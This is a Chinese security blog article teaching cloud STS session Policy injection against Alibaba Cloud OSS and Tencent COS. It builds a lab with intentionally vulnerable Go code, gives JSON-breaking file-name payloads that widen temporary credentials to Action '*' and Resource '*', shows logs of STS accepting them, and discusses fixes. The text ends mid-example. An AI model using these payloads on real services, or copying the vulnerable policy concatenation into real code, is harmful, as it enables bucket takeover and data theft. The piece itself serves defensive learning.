#  万字长文学习云安全 STS Policy注入在漏洞挖掘中的妙用  
原创 行之
                    行之  亿人安全   2026-10-13 02:37  
  
# 前言  
  
我是行之，好久都没更新了，发一篇最近分析的文章吧。随着云原生架构的普及，针对凭据与身份边界的攻击正成为主流。正好近期得知朋友挖掘了几个严重漏洞，于是跟他学习了一下思路，然后研读了一下海外云安全文献，发现是通过针对 STS（Security Token Service，安全令牌服务）的攻击：借助文件名、接口入参等可控字段篡改 STS 令牌下发逻辑，通过 STS Policy 注入获取高权限临时令牌，由此触发高危云上漏洞。原本计划讲个议题的，但国内相关研究文章偏少，既然没什么文章基础，于是先写篇长文沉淀一下，本文是我的学习过程，会从 AK/SK、STS 的基础原理讲起，搭配本地靶场搭建与真实的实战案例，为国内安全同行、白帽子提供攻防思路参考。本文纯手写原创，全文共一万字，欢迎各位安全同行交流探讨，也在此感谢先知社区提供发布平台。  
# 一、先从一个最熟悉的注入说起：SQL  
  
首先讲解STS云注入，我们最好先回到所有人都见过的 SQL 注入。它的本质其实是用户输入的数据被当作数据库代码进行了执行，也就是  
输入流入侵到了控制流的一个过程。  
  
后端这么去写：  
  
SELECT * FROM uploads WHERE owner = '{input}';  
  
开发者心里，  
input只是一个字符串值。正常输入  
alice时，数据库看到：  
  
SELECT * FROM uploads WHERE owner = 'alice';  
  
但当  
input变成  
alice' OR '1'='1，前面那个单引号先把原字符串闭合，后面的内容就进入了 SQL 语法，数据库最后看到的是一个永真条件：  
  
SELECT * FROM uploads WHERE owner = 'alice' OR '1'='1';  
  
记住这条数据流，下面会把同一个解释器换成 JSON 和云授权：  
  
用户输入 → 字符串拼接 → 某门语言的源码 → 解释器 → 改变了语义  
  
这里关于SQL注入，笔者不再赘述。历史上的很多漏洞都是  
输入流入侵到了控制流的过程，例如  
  
SSTI（模板注入）：输入进入 Freemarker、Velocity、Jinja2 的模板语法，${} 或 #{} 之间的内容被模板引擎当代码渲染，变成 RCE  
  
Log4Shell（Log4j JNDI）：输入的字符串里带 ${jndi:...}，本该只是一行日志，却被 Log4j 当成查找指令触发 JNDI 加载，RCE。  
  
所以只要我们能够找到输入流和控制流之间的关系，就可以更好的挖掘漏洞。  
# 二、STS到底是个什么东西？  
  
关于STS，很多人挖洞看到的通常是AK、SK、还有一个Token，比如长这个样子。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD484662YsLM9VIURNkjd8cMlxVHp5W4M2oqZHYxKBib9RwPDOa6d6cIuCDP5ZBUGiaFicPP0XlQEjpqBeOssrPCujKcHU4Y9RtCcok/640?wx_fmt=png&from=appmsg "")  
  
然后测试的时候一般会尝试能不能../../../或者直接调用一些现有的安全工具对这个下发的sts安全凭证进行测试，我们也可以在公众号上看到一些前辈发的文章和工具  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD48pYtRIgpDB3nL5ia9DQoHRP7NPHk5BxMUxPyD8nrqtdKJUgOqs4M0mloleCAibbJBD7cEy2763Z46IYo74YIU1259iahhDcaab4M/640?wx_fmt=png&from=appmsg "")  
  
但其实我们在挖掘一个东西之前，要去深入的了解这个东西，于是我们可以看一下云厂商文档对于STS的介绍。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4ibHsw0SOuceBAicqDfSN07VE9mTEpic3IwPWLCDfaJEhIYRfkS7aH19kgMa8lE3dNFeBzcczOKJK234E9icic84aFnAJrSdW3iclWaU/640?wx_fmt=png&from=appmsg "")  
  
其中我们可以看到一个有趣的东西，就是它的名字叫做Security Token Service，翻译过来就是安全令牌服务，那么为什么要这个东西呢，其实在早期阶段，存储桶刚出来的时候。很多开发在做文件上传，  
喜欢把AccessKey Secret硬编码在前端，来做文件上传。后来通过很多工具，例如Hae、或者Yakit，都可以对此类密钥进行扫描。互联网上关于AKSK的利用工具也是层出不穷。例如笔者曾经用过的一款teamssix 的  
cf（Cloud Exploit Framework，云利用工具）（现已停更），就有很多的功能。因此云厂商后来统一推荐用 STS：简单来说，就是由可信后端保管长期凭证，或者通过 RAM 角色获取调用 STS 的权限（  
这里用的比较多的就是PutObject和GetObject），再针对当前这一次上传签发一组临时凭证。这组凭证的有效期可以很短，权限也可以通过会话 Policy 进一步收窄，比如只允许向指定存储桶、指定目录，甚至指定对象上传文件。这样一来，长期 AK/SK 就不需要进入前端；即使临时凭证意外泄露，攻击者能够利用的时间和权限范围也都比较有限。  
  
如果还是听不懂的话，我们可以来看看这个例子  
  
很多业务都有"用户往对象存储传文件"的场景：工单附件、客服图片、头像、竞赛作品上传。把长期 AccessKey 放进浏览器是不可能的（谁拿到页面谁能复用），所以正常做法是：  
  
用户登录业务系统；  
  
浏览器要传文件时，先问业务后端要一份  
  
短期凭证  
  
；  
  
业务后端用自己的长期身份，向云厂商申请一枚 15 分钟的临时凭证（STS）；  
  
浏览器拿着这枚临时凭证，  
  
直接  
  
把文件传到对象存储。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD49CxNbHZrzNuhZ3vicjHtR3vPAZM7t6EjIpw2ibgVfPRo1n4olaLviaXbTXl3GDv5wF8quAzJwOictRiaa38iaWDFqGMYv8VibwfLbXM8/640?wx_fmt=png&from=appmsg "")  
# 三、一个简单的输入流入侵到了控制流案例  
  
如果放到代码上，我们可以手搓一个真实的业务环境，这里就拿官网的API文档举例  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD48fpZ5ibZSzvdqVecicgseFae9R7ue16nq0VeibCBkSqEsv6bmdVG8vZO1owzJFzs8y56ZszJsrricNS36Sax7FlLEMuPY9xzAkG7o/640?wx_fmt=png&from=appmsg "")  
  
这里我们需要先去创建一个RAM 用户，拿到AccessKey ID 和 AccessKey Secret  
  
{  
  
"Version": "1",  
  
"Statement": [  
  
//Statement 是具体的授权规则列表  
  
{  
  
"Effect": "Allow",  
  
//Effect 表示这条规则的效果。常见取值有：Allow：允许。Deny：拒绝。这里默认是Allow放过去  
  
"Action": "oss:PutObject",  
  
//动作，这里可以从文档里面获取，PutObject就是可以上传对象，ListObject就是列出对象  
  
"Resource": "acs:oss:*:*:examplebucket/exampledir/*"  
  
//持有这份权限的身份，可以向 examplebucket 存储桶中所有以 exampledir/ 开头的对象写入文件，但没有读取、删除或访问其他目录的权限。  
  
}  
  
]  
  
}  
  
在权限编辑页面，我们可以选择对角色权限进行编辑，以上是笔者自己从官网获取到的  
  
oss : PutObject  
  
│       │  
  
│       └── 具体操作：写入对象  
  
└────────── 云服务：对象存储 OSS  
  
oss:PutObject 主要用于向 OSS 上传或写入对象。比如：  
  
exampledir/avatar.png  
  
exampledir/report.pdf  
  
exampledir/2026/07/demo.txt  
  
Resource 表示这条权限可以作用在哪些资源上。把它拆开来看：  
  
acs : oss : * : * : examplebucket / exampledir/*  
  
│     │     │   │          │              │  
  
│     │     │   │          │              └─ 对象名称前缀  
  
│     │     │   │          └──────────────── Bucket 名称  
  
│     │     │   └─────────────────────────── 阿里云账号范围  
  
│     │     └─────────────────────────────── 地域region  
  
│     └───────────────────────────────────── 云服务  
  
└─────────────────────────────────────────── 阿里云资源名称前缀  
  
为什么我不能任意对象读取？  
  
在传统文件系统中： exampledir/../../target.txt 会被路径解析函数归一化为： ../target.txt 因此可能逃出原来的目录。 但 OSS 使用的是 Object Key，不是真实文件路径。阿里云官网明确说明，OSS 本身没有传统文件系统的文件夹概念，只是通过 Key 中的 / 模拟目录效果。所以在 OSS 语义中： exampledir/../../target.txt 通常表示的就是一个完整 Key： Key = "exampledir/../../target.txt" .. 并不天然具有“返回上级目录”的含义。它不会自动变成： target.txt 如果会话 Policy 是： "Resource": "acs:oss:*:*:examplebucket/exampledir/*" 那么 exampledir/../../target.txt 即使被接受，仍然只是一个以 exampledir/ 开头的 Key。它不会因此覆盖 Bucket 根部真正名为 target.txt 的对象。  
  
简单来说就是无论你在客户端怎么传递，到了调用的时候其实还是会以字符串的形式进行传入，不能从  
输入流入侵到控制流。  
  
哪些情况下会真的出现跨范围写入  
  
这里自己学习了开发角度，就可以很容易明白如下这个案例  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD49hwGcGVWCNdNVFcxMaU6QtCxex7Kopvts3EUorey2StxL3ps37xCMqcicF8GyUl35B6GtQQp2KDDdiaicKLENxMkfXLv0ib8n84to/640?wx_fmt=png&from=appmsg "")  
  
这里可以看到，前端请求中存在一个 fileKey 参数，它的值类似于：/2025-05-21/xxxx.xlsx，如果服务端没有自行生成 Object Key，而是直接使用前端提交的 fileKey 构造 STS 会话 Policy，那么我们就可以尝试把其中的2025-05-21 修改成其他日期，例如：2025-05-20/xxx.xlsx ，如果后端没有校验这个日期前缀是否属于当前用户，就可能据此生成下面这段权限：acs:oss:*:*:这里是存储桶的地域，不用管，是场景方自己配置的/2025-05-20/* ，  
假设 RAM 角色本身拥有整个 Bucket 的写入权限，那么角色权限与这份会话 Policy 取交集后，新签发的 STS Token 就会获得对 /2025-05-20/* 的 PutObject 权限。  
  
为什么可以进行文件覆盖和如何修复  
  
攻击者随后便可以向其他日期前缀写入文件；如果同时可以控制完整 Object Key，并指定一个已经存在的对象名称，也就是很多人喜欢挖的头像覆盖或者文件覆盖等等，在未开启版本控制的情况下，还可能覆盖原有对象。这里的关键并不是 ../../ 路径穿越，而是前端提交的 fileKey 影响了后端生成的 Resource。换句话说，  
攻击者通过修改一个普通业务参数，改变了 STS Token 最终获得的资源范围。如果 RAM 角色的权限上限已经在服务端限制为：  acs:oss:*:*:examplebucket/2025-05-21/*， 那么即使前端把日期改成 2025-05-20，后端也生成了对应的会话 Policy，这部分权限仍然不在角色的授权范围内。由于最终权限取角色策略与会话 Policy 的交集，STS Token 对 2025-05-20/* 的写入权限不会生效，实际上传时会被 OSS 拒绝。  
  
这里修复的方式也很简单，可以服务端先根据当前登录身份校验对象归属，再由服务端决定 Object Key，前端提交的文件名不参与权限判断。  
  
例如/xxxxxUserId/touxiang.png，在上传的时候后端取userID+前端拼接，此时只使用认证上下文里的用户 ID。或者就是随机字符串+文件名，真正业务场景中修复的方案有很多，可以看到云厂商也给我们提供了兜底策略  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD48ankcwpAlmUdFATS4xQbrwoCXeQ283ECAN54iaeT1FBreeicrOmGDpnfianicBk4zvm2r0cGhDh5DOS3LjIeWQewOPamVo2vHAsuQ/640?wx_fmt=png&from=appmsg "")  
  
这里作为一个补充学习即可，知道OSS 的 PutObject 支持：x-oss-forbid-overwrite: true  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4ibVAibkYjzBkUE1H0gBvheJtsrUDzaKLSP1erOzFUHSggEW4Hcje9KV3kTZs4ZZgpLVIGDEibtcDJAVTAohYQkAAfmQicQqRwlXm4/640?wx_fmt=png&from=appmsg "")  
# 四、从输入流入侵控制流再到云Policy注入的全过程  
  
这里我们按照云文档的逻辑，来创建一个权限策略  
  
名字叫做StsPolicyArticleBucketAccess20260725，其中我们赋权OSS  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD49ciaRB1Rkfj57Awnxg16bQdKcwos3NIUOBSoGlYYMfe0ZzSGaNjyaxaSQFyak7TjlKXgCQPRanoEfqRQwsrhibMrib9YDXsmfqW4/640?wx_fmt=png&from=appmsg "")  
  
这里一般的业务都会这么配置  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD4947gsRSXLAEgb6aP3fPJ8AQJMjKBMdh9R1HFRH6LF0unJGQ3ktWFgGR3pQkh9hIT1HCuv2ACS7OMVJsRJTCnNZmBMTl1t3s4Q/640?wx_fmt=png&from=appmsg "")  
  
acs:oss:*:*:sts-policy-article-20260725-7f3a  
│   │   │ │                  ││   │   │ │                  └── Bucket 名称│   │   │ └───────────────────── 阿里云账号 ID│   │   └─────────────────────── 地域│   └─────────────────────────── 对象存储 OSS└─────────────────────────────── 阿里云资源名称前缀- acs：Aliyun Cloud Service，表示阿里云资源名称。- oss：表示对象存储 OSS 服务。- 第一个 *：地域使用通配符，不限定具体 Region。- 第二个 *：账号 ID 使用通配符。- sts-policy-article-20260725-7f3a：Bucket 名称。它表示：名为 sts-policy-article-20260725-7f3a 的 Bucket 本身  
  
也就是说，当前角色拥有对 sts-policy-article-20260725-7f3a 这个 Bucket 执行 ListObjects 的权限，同时拥有对 Bucket 内对象 执行 PutObject 和 GetObject 的权限。简单来说，就是可以列出、上传和读取这个 Bucket 中的文件。 在真实业务中，为了满足不同接口的使用需求，一个 RAM 角色往往会被配置一份范围相对较大的权限。例如，负责文件管理的角色可能 需要读写整个业务 Bucket。  
但是，这份角色权限只是 STS Token 所能获得的权限上限，并不代表每次签发的临时凭证都应该继承全部权限（这点很重要，其实很多师傅在和我聊漏洞修复的过程中都会探讨这方面的问题）。 服务端在调用 AssumeRole 时，还可以再传入一份会话 Policy，把本次 STS Token 的权限继续往小了压。最终权限取 RAM 角色权限与 会话 Policy 的交集： STS Token 最终权限 = RAM 角色权限 ∩ 会话 Policy  
  
按照我的理解，大概是这个意思：  
假设你爸爸手里一共有 100 元，这 100 元就是 RAM 角色拥有的权限上限。虽然你和你爸爸是一家人，但这并不代表你自动拥有这 100 元的支配权。你这次到底能花多少钱，还要看你爸爸实际给了你多少额度，而这个额度就相当于会话 Policy。 如果你爸爸说，这 100 元你都可以花，那么你这次最多可以花 100 元；如果他说，你只能花其中的 50 元，剩下的 50 元要留着买菜， 那么你这次能够支配的就只有 50 元。 剩下的 50 元依然属于你爸爸，也就是仍然处在 RAM 角色的权限范围内，但它并不属于你这次拿到的 STS Token。 反过来也是一样：假设会话 Policy 写着你可以花 200 元，但你爸爸手里总共只有 100 元，那么你最终还是只能花 100 元。因为会话 Policy 只能在角色原有权限内做减法，无法突破角色本身的权限上限。 所以可以简单理解为： 爸爸拥有的总金额 = RAM 角色权限 这次给你的消费额度 = 会话 Policy 你最终可以花的钱   = 两者的交集 如果会话 Policy 配置得过大，而 RAM 角色本身又拥有整个 Bucket 的读写权限，那么本次签发的 STS Token 就可能继承角色的全部权限，这也是很多 STS 越权问题产生的原因。  
  
这里我们创建好了之后，来创建一个角色。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4icEeXNWDLSWazTpNO7IoUvgd66KVOISiaLA1IEuglWKJRP5v6QWQGrJlhP0ibUE7voZeR0pibX8XnwibiaFEiaJzrEVE7bHVJ1CiaNyL8/640?wx_fmt=png&from=appmsg "")  
  
这里可以看到是用RAM用户扮演RAM角色，所以我们直接把创建好的用户，继承之前创建好的权限即可。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD4ibo3anzohJmmIBS1HzHTA8Libf3fpw8D24nEdz3H0Q6NMicPicptymJRicia51BFUtrY8KPM20mtXxIeWuLoAG9tJ1V8uyAJBMYtXV8/640?wx_fmt=png&from=appmsg "")  
  
代码案例  
  
互联网企业主流的是Java和Go，因此本文使用Go语言来作为代码演示  
  
首先是后端写法，我们在真实业务场景中一般不会对Policy生成的STS做List Object权限，一般是给Put和Get权限  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD4ibld9HuAia3LciacuJu2dXtqS0k9OibENFolziaOYfqEF3zsHicXgp5PksFVghOKWdZ8iajSyr0y6NRpQeibvkdB9SJ5S4tiaYUbib51BLg/640?wx_fmt=png&from=appmsg "")  
  
func aliyunVulnerablePolicy(bucket, fid string) string {  
  
return fmt.Sprintf(  
  
`{"Version":"1","Statement":[{"Effect":"Allow","Action":["oss:GetObject","oss:PutObject"],"Resource":["acs:oss:*:*:%s/%s"]}]}`,  
  
bucket, fid)  
  
}  
  
这里我们的前端可以控制上传的文件名来拿到STS，同时通过STS和文件内容，来对文件进行上传  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD48jkQqIIneXr0gT16ads9hibdka53Pvv7aicx5EG0G5jY8KVWdmxcepnQfrKOYbZPQU6wZ1jwic8L4wUF2wRR6tKicB9icjcVojVUSk/640?wx_fmt=png&from=appmsg "")  
  
可以看到这个也是很多正常场景能够获取到的值  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4ick1G9EsOX2ab0DAt8w9cu7T4lsAdWaUtXF37yTMzDXteKd9nvRgcuiagyG2DNicQcKDbGfwCbmj3llwWTVteAia75icL2UW52cCgA/640?wx_fmt=png&from=appmsg "")  
  
通过阿里云SDK对目前STS获取到的权限做分析，发现仅拥有对xingzhi666.png的文件上传权限，这里就不写代码进行调用了。直接让AI分析即可  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD49OVaVTDMIgxYeQ0s1ibj7FV1bJnKfc0UgRNAmuc807FJicOJWs3qkLPBEiakXv0Hia8ibpH8osf3hnXOlDa6dyFyEQTOJkyaCKEkws/640?wx_fmt=png&from=appmsg "")  
  
通过获取到的STS也是不能直接对OSS Browser拥有登录权限的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD481HnJUDIr1ncq0pHvE6KWmOo78VL3pdOB0ZldE0p6nkUFyibdFRB1zvuXSibibzicIs6ruaia4uHDgfa2LPNc5rdC7yj4kLEKu1wE8/640?wx_fmt=png&from=appmsg "")  
  
这里我们去看一下代码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD49g9nA335FXC0TjeJic2ia9VyNCRyfdpAyjuRESZL8dLB7LXJelUUHs4mRJYcDs0rdy0QlLGQT1BJymcuEy9C7iax04UOfC7uy1gI/640?wx_fmt=png&from=appmsg "")  
  
在获取/api/v1/sts路由过来的fulPathFid参数后，发送给了AssumeRole(fullPathFid)  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD48xnxVwMRVzibhbvjDDvv9kyAPQjBUpzcXwrukP6qBvalCGMey1dywicibygkmwME9bnvCcRUTZmWVOIxhMqn4cxzjYlSneTssJL0/640?wx_fmt=png&from=appmsg "")  
  
这里发现并没有对传递进来的内容做任何限制，而是传递到了下一层的provider.go  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD487lzicKF1THr6IF8RDSafnVNjobT6xjibS4jG8wKqo4Pic8JxcGdbm1QxFku5BLcE5u7IFsdofEXQZcI2T8vMDLDWDkibibBIicbZ2k/640?wx_fmt=png&from=appmsg "")  
  
这里的第一个参数为bucket的值，是不可控的。第二个是fullpath的值，也就是文件名，此时文件名可控，所以最后的数据流转过程就是  
  
main.go:77  
  
读取 文件名  
  
↓  
  
main.go:87  
  
p.AssumeRole(fid)  
  
↓  
  
aliyun.go:24  
  
生成 Policy  
  
↓  
  
provider.go:38-41  
  
fmt.Sprintf 拼接 fullPathFid  
  
↓  
  
aliyun.go:38  
  
Policy 放入 AssumeRoleRequest  
  
↓  
  
aliyun.go:40  
  
调用 STS AssumeRole  
  
↓  
  
aliyun.go:45-55  
  
返回临时 STS 凭证  
  
还记得我们之前说过什么么，我们要找的是输入流可以入侵控制流的过程。我们来看这段代码  
  
{  
  
"Version": "1",  
  
"Statement": [  
  
{  
  
"Effect": "Allow",  
  
"Action": [  
  
"oss:GetObject",  
  
"oss:PutObject"  
  
],  
  
"Resource": [  
  
"acs:oss:*:*:%s/%s"  
  
]  
  
}  
  
]  
  
}  
  
此时我们知道了最后一个地方可以控制，那我们是不是可以注入写成  
  
{  
  
"Version": "1",  
  
"Statement": [  
  
{  
  
"Effect": "Allow",  
  
"Action": [  
  
"oss:GetObject",  
  
"oss:PutObject"  
  
],  
  
"Resource": [  
  
"acs:oss:*:*:存储桶的名字/x"  
  
],  
  
"Action": [  
  
"oss:ListObjects"  
  
],  
  
"Resource": [  
  
"acs:oss:*:*:存储桶的名字"  
  
]  
  
}  
  
]  
  
}  
  
这里很多人可能看不懂我在干什么，如果我把Payload拿出来应该就可以看得懂了。  
  
这里的 Payload 会被放进原始 Policy 模板中第二个 %s 对应的位置。  
  
原始代码是：  
  
func aliyunVulnerablePolicy(bucket, fid string) string {  
  
return fmt.Sprintf(  
  
`{"Version":"1","Statement":[{"Effect":"Allow","Action":["oss:GetObject","oss:PutObject"],"Resource":["acs:oss:*:*:%s/%s"]}]}`,  
  
bucket, fid)  
  
}  
  
假设  
  
bucket = BUCKET  
  
fid = x"],"Action":["oss:ListObjects"],"Resource":["acs:oss:*:*:*  
  
拼接后大致会变成：  
  
{  
  
"Version": "1",  
  
"Statement": [  
  
{  
  
"Effect": "Allow",  
  
"Action": [  
  
"oss:GetObject",  
  
"oss:PutObject"  
  
],  
  
"Resource": [  
  
"acs:oss:*:*:BUCKET/x"  
  
],  
  
"Action": [  
  
"oss:ListObjects"  
  
],  
  
"Resource": [  
  
"acs:oss:*:*:*"  
  
]  
  
}  
  
]  
  
}  
  
这里我们依旧需要先理解几个基本概念。前面已经提到，Action 代表允许执行的操作，Resource 代表这些操作可以作用的资源。原本的代码只给 Policy 配置了：  
  
"Action": [  
  
"oss:GetObject",  
  
"oss:PutObject"  
  
]  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD48gAkyjWazb842w7gI0fbJ8NZlQPL8AiaibzgZbBlJ4lJVf8b5rE65ulUH3QcotHNrsicyCwzy6NFMKYiays6UiazALfCqsqDO3Wicib8/640?wx_fmt=png&from=appmsg "")  
  
拼接后的数据到底到了哪里？  
  
因此，正常情况下，这份 Policy只允许读取和上传对象，并没有 oss:ListObjects 权限。 但现在，我把文件名参数当作 Payload 传入： x"],"Action":["oss:ListObjects"],"Resource":["acs:oss:*:*:* 其中： x"] 用于闭合原来 Resource 数组中的字符串和数组； ,"Action":["oss:ListObjects"] 用于追加新的 Action 字段； ,"Resource":["acs:oss:*:*:* 用于追加新的 Resource 字段，并把资源范围扩大到更大的范围。 最后，原始模板后面剩余的： "]}]} 继续补全整个 JSON 结构。 因此，问题并不是我们修改了 Go 源码中的 Action，而是通过文件名参数注入，让原本只应当作为数据使用的 fid 参与了 Policy JSON 的生成。后端随后把这段拼接结果交给阿里云 SDK，SDK 再调用 STS 的 AssumeRole 接口申请临时凭证。  
  
最终得到的Payload就变成了  
  
?fid=x%22%5D%2C%22Action%22%3A%5B%22*%22%5D%2C%22Resource%22%3A%5B%22*  
  
这里出现了  
重复键  
Action。绝大多数 JSON 解析器对重复键采用"后者覆盖"，于是这条 Statement 的  
Action最终是  
["*",""]，  
Resource是  
[bucket/*, *]——一条 Statement、Statement 数还是 1，但权限已经被放大到"任意动作、任意资源"（受角色上限约束）。  
  
所以 Policy 注入和 SQL 注入同构：边界字符从单引号换成双引号、方括号、花括号；解释器从 SQL parser 换成 JSON parser + 云端授权。修复思路也一样：  
数据保持数据，不让它参与语法生成。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD48eCibYg2HkPCNe0XBzUI5baGLsFWalQYv97RxBS5ZIvZ6nBYyjZenicenOW7EWiaID3MhVib3j1KpKjqVPhLa7icMicFSvpm881LGKo/640?wx_fmt=png&from=appmsg "")  
# 漏洞验证  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD4ibcXUE5l0HLOak6p7eLyuDNuouB08biaiaoE8CbxhUs74HqQPYkl0go5pobyAZB5hffjXm9TkiaWLicf9djzO7EXpmjwPPNYA3Z5Us/640?wx_fmt=png&from=appmsg "")  
  
使用Policy注入得到的高权限STS接管存储桶进行列桶  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD492Fzl5XjVGl2uYvbSibRmBoRzP3m5RnW5CdGE3z3xS7TrDJR4ib11uULbY9HzzCWaKktH9NYP4Rtq8jnGj5h3Frdbata7XIJ6gg/640?wx_fmt=png&from=appmsg "")  
  
这里需要注意的是我们的权限在到Action上限的约束，没有办法对文件进行删除（但是真实环境中一般都会给ram，控制台，文件管理权限）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD4ibSmAicbiaOSrdHHDUDpnem4CzwQ8eibgvNqNaE2L2IYhceY24ZRJicF3Sa9GOVvR2OkTeE9IYXoSfp8fA910sV9mIUU9B2LZ4pApc/640?wx_fmt=png&from=appmsg "")  
# 复盘一下链路  
  
浏览器  GET /api/v1/sts?fullPathFid=X  
  
→ 后端 handler  
  
→ provider.go 的 aliyunVulnerablePolicy(bucket, X)   把 X 拼进 Policy JSON  
  
→ 把这段 Policy 作为 Policy 参数传给 STS SDK 的 AssumeRole  
  
→ SDK 把它 URL 编码 + HMAC 签名，发 HTTP GET 到  
  
https://sts.aliyuncs.com/?Action=AssumeRole&...&Policy=<urlencode>&Signature=...  
  
→ STS 返回临时凭证（AccessKeyId/Secret/SecurityToken/Expiration + RequestId）  
  
→ 后端把临时凭证交给浏览器  
  
→ 浏览器用临时凭证 PUT 到对象存储  
  
所以"拼接后的语句"经过的是：  
后端代码 → SDK → 一条签名后的 HTTP GET（Policy 在 query 里）→ STS。  
  
[AssumeRole] provider=aliyun fullPathFid="*\",\"*\"],\"Action\":[\"*\",\""  
  
拼接后发给 STS 的 Policy: {"Version":"1","Statement":[{"Effect":"Allow","Action":["oss:PutObject"],"Resource":["acs:oss:*:*:sts-policy-article-20260725-7f3a/*","*"],"Action":["*",""]}]}  
  
(经 SDK 签名为 HTTP 请求发往 STS  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD4icCYn5s2RkMag6Asr000Ldiap6Y2gkwCdBtoOPGpK3MCkGxWA5ot5gia2kd99rZwTp7qZkxGbNJ9Regq79w68jEKFwzJMgQ8OKdo/640?wx_fmt=png&from=appmsg "")  
# 其他的云是否也可以这么利用？  
  
我们来看一下其他云的逻辑，可以发现整体上的区别是不大的，只是在Policy申请的时候有一些细微的区别。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD48yQoAKSJlw2AIxfH6lz6tVTmsic7czbYH0pyg6LDCXCiap3Tl1moDkEXrEBI3BbT3E5C4a4s5nxMq6JVNia7yFiadftou94jjUoME/640?wx_fmt=png&from=appmsg "")  
  
这里需要跟上用户id  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD48IU5g4dXnWZyEbEQnu5FhDhPRg2aFu1CriaegoBBUFSmGAibsMTQxqFnVNk1q7e1vZGhicJfhxG53gsibrH72YH1UIqJGriaNRAQOw/640?wx_fmt=png&from=appmsg "")  
  
这里其实都差不多，跟着文档走即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD48stdG0hyPqE2M3traQr1yuGgHy1UAhmWaoseYkzwRz7bqsR19MfAE0xPopS5KtNOQ2Bq2RHousJ046ZJ5gRcxVPqMjoRcMC3s/640?wx_fmt=png&from=appmsg "")  
  
这里还是先配置一个策略  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD4icmhTOxPRMr4ibNRhkjwxcf8k6DWmLVEhqzGicndXvXOF73eU344VgBTqGeTswImlqKFy7Tpkc1ic5xx0UjNYSM3gub5L5cbcKcdU/640?wx_fmt=png&from=appmsg "")  
  
我们赋予多个权限  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD49lxKAx7PwbI1bkcqeeZ2XyQTvR7QnjnxY4CCufm4fcoZR0JiawkyxHkxg2HjNIG8cuTMnKqszBOeg13iaNF869EYsBQLtiaHrpAY/640?wx_fmt=png&from=appmsg "")  
  
唯一不同的是我在这里配置Action为所有  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD493iaxOUDRToJgibeeicPEJQ6oMYPoxNtO6aIkPjiaic4PkfCk5ib7iamthUOVKicMARm9RoHyeZwcVcRaxw4O6N0LuPPRNu2qdhIFlQy0/640?wx_fmt=png&from=appmsg "")  
  
之后就是创建角色，然后在Policy后端对权限进行收缩。确保只有Put Object和GetObject权限  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jkSyaHNyD48ic0PNbLVsvudKwl3jn8zKz7GDOAzh4IDbDPHufOwbmYy6yzNLum9jialR1NxibZgqT5fJ2891Vf4aVia5JpM1tqjxLjx8sPfsQ1k/640?wx_fmt=png&from=appmsg "")  
  
这里我们的代码其实并不需要大改  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/jkSyaHNyD4icHCiccXDConO6dXn7icoFoib96a7RlJickthiadXkNyk9vGTtfbd9FQW2LQj0KiarQwab9GhVS6ujuRzt5VnxbYAEsTMqC5mMzVhBicg/640?wx_fmt=png&from=appmsg "")  
  
后端的代码为  
  
func tencentVulnerablePolicy(region, appID, bucket, fid string) string {  
  
return fmt.Sprintf(  
  
`{"version":"2.0","statement":[{"effect":"allow","action":["cos:GetObject","cos:PutObject"],"resource":["qcs::cos:%s:uid/%s:%s/%s"]}]}`,  
  
region, appID, bucket, fid)  
  
}  
  
注入的Payload为  
  
uploads/alice/x.txt"]},{"effect":"allow","action":["*"],"resource":["*  
  
腾讯云 COS 的资源格式通常写成：  
  
qcs::cos:<region>:uid/<appId>:<bucket>/<object-key>  
  
比如我的是：  
  
qcs::cos:ap-guangzhou:uid/1320513951:BUCKET/uploads/alice/x.txt  
  
腾讯云 COS 的 Resource 通常需要使用包含地域、AppID、Bucket 和 Object Key 的完整 qcs 格式，因此最初构造的 Payload 比较长。不过，经过实测，腾讯云 STS 也接受 Resource:["*"] 这种通配资源写法。因此，在当前字符串拼接模板下，可以将 Payload 缩短为：uploads/alice/x.txt"]},{"effect":"allow","action":["*"],"resource":["*  
该 Payload 先闭合原有的第一条 Statement，再追加一条 Action:*、Resource:* 的新 Statement。腾讯云 STS 实际接受了这份 Policy，返回结果中包含两条 Statement。最终权限仍然受到 CAM 角色权限上限和其他显式拒绝策略的约束。  
  
因此最终可以变成：  
  
{  
  
"version": "2.0",  
  
"statement": [  
  
{  
  
"effect": "allow",  
  
"action": [  
  
